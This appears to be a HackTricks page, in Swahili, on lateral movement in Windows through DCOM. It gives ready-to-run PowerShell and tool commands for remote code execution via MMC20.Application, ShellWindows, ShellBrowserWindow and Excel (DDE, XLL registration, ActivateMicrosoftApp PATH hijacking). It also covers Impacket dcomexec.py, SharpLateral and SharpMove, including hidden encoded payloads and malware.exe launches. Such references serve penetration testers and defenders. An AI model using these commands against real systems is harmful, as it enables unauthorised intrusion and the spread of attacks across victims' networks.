# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement ni ya kuvutia kwa sababu hutumia tena COM servers zilizopo zinazowasilishwa kupitia RPC/DCOM badala ya kuunda service au scheduled task. Kwa kawaida, hii inamaanisha kuwa muunganisho wa awali huanza kwenye TCP/135 na kisha kuhamia kwenye RPC ports za juu zinazotengwa dynamically.

## Prerequisites & Gotchas

- Kwa kawaida unahitaji local administrator context kwenye target, na remote COM server lazima iruhusu remote launch/activation.
- Tangu **Machi 14, 2023**, Microsoft inalazimisha DCOM hardening kwenye mifumo inayotumika. Clients za zamani zinazoomba kiwango cha chini cha activation authentication zinaweza kushindwa isipokuwa zinegotiate angalau `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Windows clients za kisasa kwa kawaida huongezewa kiwango hicho automatically, hivyo tooling ya sasa kwa kawaida huendelea kufanya kazi.<sup>[[3]](#references)</sup>
- DCOM execution ya manual au scripted kwa ujumla inahitaji TCP/135 pamoja na dynamic RPC port range ya target. Ikiwa unatumia Impacket's `dcomexec.py` na unataka command output irudi, kwa kawaida unahitaji pia SMB access kwenye `ADMIN$` (au share nyingine yenye uwezo wa kusomeka/kuandikika).
- Ikiwa RPC/DCOM inafanya kazi lakini SMB imezuiwa, `dcomexec.py -nooutput` bado inaweza kuwa muhimu kwa blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Kwa maelezo zaidi kuhusu technique hii, angalia [chapisho la awali la MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects hutoa uwezo wa kuvutia wa interactions zinazotegemea network na objects. Microsoft hutoa documentation ya kina kwa DCOM na Component Object Model (COM), inayopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Orodha ya DCOM applications inaweza kupatikana kwa kutumia PowerShell command:
```bash
Get-CimInstance Win32_DCOMApplication
```
Kitu cha COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), huwezesha scripting ya shughuli za MMC snap-in. Muhimu, kitu hiki kina method ya `ExecuteShellCommand` chini ya `Document.ActiveView`. Maelezo zaidi kuhusu method hii yanaweza kupatikana [hapa](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Ijaribu ikiendeshwa:<sup>[[6]](#references)</sup>

Kipengele hiki huwezesha utekelezaji wa commands kupitia network kwa kutumia DCOM application. Ili kuingiliana na DCOM remotely ukiwa admin, PowerShell inaweza kutumika kama ifuatavyo:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Amri hii huunganisha kwenye application ya DCOM na kurudisha instance ya COM object. Kisha method ya ExecuteShellCommand inaweza kuitwa ili ku-execute process kwenye remote host. Mchakato huu unahusisha hatua zifuatazo:

Kagua methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Pata RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Hoja ya mwisho ni mtindo wa dirisha. `7` huweka dirisha katika hali ya kupunguzwa. Kiutendaji, execution inayotegemea MMC kwa kawaida husababisha mchakato wa mbali wa `mmc.exe` kuanzisha payload yako, ambao ni tofauti na objects zinazotegemea Explorer zilizo hapa chini.

## ShellWindows & ShellBrowserWindow

**Kwa maelezo zaidi kuhusu technique hii, angalia post ya awali [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Object ya **MMC20.Application** iligunduliwa kuwa haina "LaunchPermissions" zilizoainishwa wazi, hivyo hutumia permissions za kawaida zinazoruhusu Administrators kufikia. Kwa maelezo zaidi, thread inaweza kuchunguzwa [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na inashauriwa kutumia OleView .NET ya [@tiraniddo](https://twitter.com/tiraniddo) kuchuja objects zisizo na Launch Permission iliyoainishwa wazi.

Objects mbili mahususi, `ShellBrowserWindow` na `ShellWindows`, ziliangaziwa kwa sababu hazina Launch Permissions zilizoainishwa wazi. Kutokuwepo kwa registry entry ya `LaunchPermission` chini ya `HKCR:\AppID\{guid}` kunaashiria kutokuwepo kwa permissions zilizoainishwa wazi.

Ikilinganishwa na `MMC20.Application`, objects hizi mara nyingi huwa tulivu zaidi kwa mtazamo wa OPSEC, kwa sababu command kwa kawaida huishia ikiwa child ya `explorer.exe` kwenye host ya mbali badala ya `mmc.exe`.

### ShellWindows

Kwa `ShellWindows`, ambayo haina ProgID, methods za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` hurahisisha kuunda object kwa kutumia AppID yake. Mchakato huu hutumia OleView .NET kupata CLSID ya `ShellWindows`. Baada ya kuundwa, interaction inawezekana kupitia method ya `WindowsShell.Item`, na kusababisha method invocation kama `Document.Application.ShellExecute`.

Mifano ya commands za PowerShell ilitolewa ili kuunda object na kutekeleza commands remotely:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` inafanana, lakini unaweza kuiunda moja kwa moja kupitia CLSID yake na kuhamia kwenye `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement kwa Excel DCOM Objects

Lateral movement inaweza kufanikishwa kwa kutumia vibaya DCOM Excel objects. Kwa maelezo ya kina, inashauriwa kusoma mjadala kuhusu kutumia Excel DDE kwa lateral movement kupitia DCOM kwenye [blogu ya Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Mradi wa Empire unatoa PowerShell script inayoonyesha matumizi ya Excel kwa remote code execution (RCE) kwa kudhibiti DCOM objects. Hapa chini kuna vipande vya script vinavyopatikana kwenye [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), vinavyoonyesha mbinu tofauti za kutumia vibaya Excel kwa RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Utafiti wa hivi karibuni umepanua eneo hili kwa kutumia method ya `ActivateMicrosoftApp()` ya `Excel.Application`. Wazo kuu ni kwamba Excel inaweza kujaribu kuzindua Microsoft applications za zamani kama FoxPro, Schedule Plus, au Project kwa kutafuta kwenye system `PATH`. Ikiwa operator anaweza kuweka payload yenye mojawapo ya majina yanayotarajiwa katika location inayoweza kuandikika na iliyo sehemu ya `PATH` ya target, Excel itaitekeleza.<sup>[[4]](#references)</sup>

Mahitaji ya variation hii:

- Local admin kwenye target
- Excel iliyosakinishwa kwenye target
- Uwezo wa kuandika payload kwenye directory inayoweza kuandikika iliyo katika `PATH` ya target

Mfano wa vitendo unaotumia lookup ya FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Ikiwa host inayofanya shambulizi haina `Excel.Application` ProgID iliyosajiliwa locally, instantiate remote object kwa kutumia CLSID badala yake:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Values zinazoonekana kutumiwa vibaya katika mazoezi:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Automation Tools za Lateral Movement

Tools mbili zimeangaziwa kwa ajili ya ku-automate techniques hizi:

- **Invoke-DCOM.ps1**: PowerShell script iliyotolewa na Empire project inayorahisisha invocation ya methods tofauti za ku-execute code kwenye remote machines. Script hii inapatikana kwenye Empire GitHub repository.

- **SharpLateral**: Tool iliyoundwa kwa ajili ya ku-execute code remotely, ambayo inaweza kutumiwa kwa command:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Zana za Kiotomatiki

- Script ya Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) inaruhusu kwa urahisi kutumia njia zote zilizo na maelezo ya kutekeleza code kwenye mashine zingine.
- Unaweza kutumia `dcomexec.py` ya Impacket kutekeleza amri kwenye mifumo ya mbali kwa kutumia DCOM. Builds za sasa zinaunga mkono `ShellWindows`, `ShellBrowserWindow`, na `MMC20`, na kwa chaguo-msingi hutumia `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Unaweza pia kutumia [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Unaweza pia kutumia [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement kwa kutumia MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement kupitia DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Dhibiti mabadiliko ya Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Tumia vibaya uwezo wa DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Kutumia Excel DDE kwa lateral movement kupitia DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
{{#include ../../banners/hacktricks-training.md}}
